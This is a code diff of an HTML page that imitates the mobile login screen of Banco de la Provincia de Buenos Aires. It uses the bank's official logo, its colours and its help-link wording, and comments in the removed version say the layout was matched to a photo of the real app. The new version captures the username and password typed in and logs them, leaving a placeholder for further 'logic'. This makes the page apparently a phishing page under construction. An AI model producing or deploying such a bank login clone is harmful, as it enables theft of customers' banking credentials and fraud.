@@ -1,241 +1,239 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Banco Provincia</title>
-<!-- Fuente Roboto para igualar al celular -->
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-<!-- Iconos para el ojo -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de la Provincia de Buenos Aires</title>
+    <!-- Usamos FontAwesome para el icono del ojo -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --verde-principal: #009b5c; /* Verde característico */
+            --gris-texto: #333333;
+            --gris-input: #f2f2f2;
+            --borde-inferior: #cccccc;
+            --gradiente-header: linear-gradient(90deg, #009b5c 0%, #2ebcb5 100%);
+        }
 
-<style>
-  :root {
-    --verde-banco: #009b5c; /* Verde base */
-    --gradiente-header: linear-gradient(90deg, #009b5c 0%, #2ebcb5 100%);
-    --gris-input: #f8f8f8;
-    --texto-gris: #333333;
-    --boton-color: #3c3c3c;
-  }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #eef3f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-  body {
-    font-family: 'Roboto', sans-serif;
-    background-color: #eef3f7; /* Fondo gris azulado suave */
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-  }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
 
-  .phone-frame {
-    width: 100%;
-    max-width: 400px;
-    background-color: #ffffff;
-    min-height: 100vh;
-    position: relative;
-    box-shadow: 0 0 15px rgba(0,0,0,0.1);
-  }
+        @media (min-width: 401px) {
+            .login-container {
+                height: 90vh;
+                border-radius: 12px;
+                overflow: hidden;
+            }
+        }
 
-  @media (min-width: 401px) {
-    .phone-frame {
-      height: 90vh;
-      border-radius: 12px;
-      overflow: hidden;
-      margin-top: 20px;
-      margin-bottom: 20px;
-    }
-  }
+        header {
+            background: var(--gradiente-header);
+            padding: 20px 15px;
+            text-align: center;
+            color: white;
+        }
 
-  /* HEADER EXACTO A LA FOTO */
-  header {
-    background: var(--gradiente-header);
-    padding: 20px 20px 15px 20px;
-    text-align: center;
-    color: white;
-  }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
 
-  .logo-area {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    margin-bottom: 10px;
-  }
+        .logo-img {
+            width: 30px;
+            height: 30px;
+        }
 
-  .logo-img {
-    width: 32px;
-    height: 32px;
-    object-fit: contain;
-  }
+        h1 {
+            font-size: 1.2rem;
+            font-weight: 500;
+        }
 
-  h1 {
-    font-size: 1.2rem;
-    font-weight: 500;
-    margin: 0;
-  }
+        .subtitulo {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-top: 5px;
+        }
 
-  .subtitulo {
-    font-size: 1.1rem;
-    font-weight: 700;
-    margin-top: 10px;
-  }
+        form {
+            padding: 30px 25px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
 
-  /* FORMULARIO */
-  form {
-    padding: 30px 25px;
-    flex-grow: 1;
-    display: flex;
-    flex-direction: column;
-  }
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
 
-  .input-group {
-    margin-bottom: 25px;
-    position: relative;
-  }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--gris-texto);
+        }
 
-  label {
-    display: block;
-    margin-bottom: 8px;
-    font-weight: 500;
-    font-size: 0.95rem;
-    color: var(--texto-gris);
-  }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 10px;
+            font-size: 1rem;
+            border: none;
+            border-bottom: 2px solid var(--borde-inferior);
+            background-color: var(--gris-input);
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
 
-  input[type="text"],
-  input[type="password"] {
-    width: 100%;
-    padding: 12px 10px;
-    font-size: 1rem;
-    border: none;
-    border-bottom: 2px solid #cccccc;
-    background-color: var(--gris-input);
-    color: var(--texto-gris);
-    outline: none;
-    transition: border-color 0.3s;
-  }
+        input:focus {
+            border-bottom-color: var(--verde-principal);
+            background-color: #fff;
+        }
 
-  input:focus {
-    border-bottom-color: var(--verde-banco);
-    background-color: #fff;
-  }
+        input::placeholder {
+            color: #999;
+        }
 
-  input::placeholder {
-    color: #999999;
-  }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 35px; 
+            background: none;
+            border: none;
+            color: var(--verde-principal);
+            cursor: pointer;
+            font-size: 1.1rem;
+        }
 
-  /* BOTÓN DEL OJO */
-  .toggle-pass-btn {
-    position: absolute;
-    right: 10px;
-    top: 38px; 
-    background: none;
-    border: none;
-    color: var(--verde-banco);
-    cursor: pointer;
-    font-size: 1.1rem;
-  }
+        .btn-ingresar {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--gris-texto);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
 
-  /* BOTÓN INGRESAR */
-  .btn-ingresar {
-    width: 100%;
-    padding: 14px;
-    background-color: var(--boton-color);
-    color: white;
-    border: none;
-    border-radius: 4px;
-    font-size: 1rem;
-    font-weight: 500;
-    cursor: pointer;
-    margin-top: 10px;
-  }
+        .btn-ingresar:hover {
+            background-color: #555;
+        }
 
-  .btn-ingresar:hover {
-    background-color: #555;
-  }
+        .links-footer {
+            padding: 20px 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            border-top: 1px solid #eee;
+            background-color: #fafafa;
+        }
 
-  /* LINKS INFERIORES */
-  .links-container {
-    padding: 20px 25px;
-    display: flex;
-    flex-direction: column;
-    gap: 15px;
-    border-top: 1px solid #eeeeee;
-    background-color: #fafafa;
-  }
+        .link-item {
+            text-decoration: underline;
+            color: var(--verde-principal);
+            font-size: 0.9rem;
+            text-align: left;
+        }
 
-  .link-item {
-    text-decoration: underline;
-    color: var(--verde-banco);
-    font-size: 0.9rem;
-    text-align: left;
-  }
-
-  .link-item:hover {
-    color: #007a2b;
-  }
-  
-  .required {
-    color: red;
-  }
-</style>
+        .required {
+            color: red;
+        }
+    </style>
 </head>
 <body>
 
-<div class="phone-frame">
-  <header>
-    <div class="logo-area">
-      <!-- LOGO OFICIAL BANCO PROVINCIA -->
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Banco_de_la_Provincia_de_Buenos_Aires_Logo.svg/1200px-Banco_de_la_Provincia_de_Buenos_Aires_Logo.svg.png" alt="Logo BP" class="logo-img">
-      <h1>Banco Provincia</h1>
+<div class="login-container">
+    <header>
+        <div class="logo-area">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Banco_de_la_Provincia_de_Buenos_Aires_Logo.svg/1200px-Banco_de_la_Provincia_de_Buenos_Aires_Logo.svg.png" alt="Logo BP" class="logo-img">
+            <h1>Banco Provincia</h1>
+        </div>
+        <div class="subtitulo">Iniciá sesión</div>
+    </header>
+
+    <form id="miFormulario">
+        <div class="input-group">
+            <label for="usuario">Tu usuario <span class="required">*</span></label>
+            <input type="text" id="usuario" name="usuario" placeholder="Ingresá tu nombre de usuario" required>
+        </div>
+
+        <div class="input-group">
+            <label for="clave">Tu clave <span class="required">*</span></label>
+            <input type="password" id="clave" name="clave" placeholder="Ingresá tu clave" required>
+            <button type="button" class="toggle-password" onclick="togglePassword()">
+                <i class="fa-regular fa-eye"></i>
+            </button>
+        </div>
+
+        <button type="submit" class="btn-ingresar">ingresar</button>
+    </form>
+
+    <div class="links-footer">
+        <a href="#" class="link-item">¿No sos BIP? Registrate</a>
+        <a href="#" class="link-item">Bloqueé u olvidé mi usuario y/o clave</a>
+        <a href="#" class="link-item">Conocé como hacerte usuario u operar</a>
+        <a href="#" class="link-item">Recomendaciones de seguridad</a>
     </div>
-    <div class="subtitulo">Iniciá sesión</div>
-  </header>
-
-  <form action="#" method="POST">
-    
-    <div class="input-group">
-      <label for="usuario">Tu usuario <span class="required">*</span></label>
-      <input type="text" id="usuario" name="username" placeholder="Ingresá tu nombre de usuario" required>
-    </div>
-
-    <div class="input-group">
-      <label for="clave">Tu clave <span class="required">*</span></label>
-      <input type="password" id="clave" name="password" placeholder="Ingresá tu clave" required>
-      <button type="button" class="toggle-pass-btn" onclick="togglePassword()">
-        <i class="fa-regular fa-eye"></i>
-      </button>
-    </div>
-
-    <button type="submit" class="btn-ingresar">ingresar</button>
-  </form>
-
-  <div class="links-container">
-    <a href="#" class="link-item">¿No sos BIP? Registrate</a>
-    <a href="#" class="link-item">Bloqueé u olvidé mi usuario y/o clave</a>
-    <a href="#" class="link-item">Conocé como hacerte usuario u operar</a>
-    <a href="#" class="link-item">Recomendaciones de seguridad</a>
-  </div>
 </div>
 
 <script>
-  function togglePassword() {
-    const passwordInput = document.getElementById('clave');
-    const icon = document.querySelector('.toggle-pass-btn i');
-    
-    if (passwordInput.type === 'password') {
-      passwordInput.type = 'text';
-      icon.classList.remove('fa-eye');
-      icon.classList.add('fa-eye-slash');
-    } else {
-      passwordInput.type = 'password';
-      icon.classList.remove('fa-eye-slash');
-      icon.classList.add('fa-eye');
+    // Función para mostrar/ocultar contraseña
+    function togglePassword() {
+        const passwordInput = document.getElementById('clave');
+        const icon = document.querySelector('.toggle-password i');
+        
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            icon.classList.remove('fa-eye');
+            icon.classList.add('fa-eye-slash');
+        } else {
+            passwordInput.type = 'password';
+            icon.classList.remove('fa-eye-slash');
+            icon.classList.add('fa-eye');
+        }
     }
-  }
+
+    // Aquí puedes agregar tu lógica personalizada
+    document.getElementById('miFormulario').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const usuario = document.getElementById('usuario').value;
+        const clave = document.getElementById('clave').value;
+        
+        console.log("Usuario:", usuario);
+        console.log("Clave:", clave);
+        
+        // Tu lógica aquí...
+    });
 </script>
 
 </body>
 </html>
+
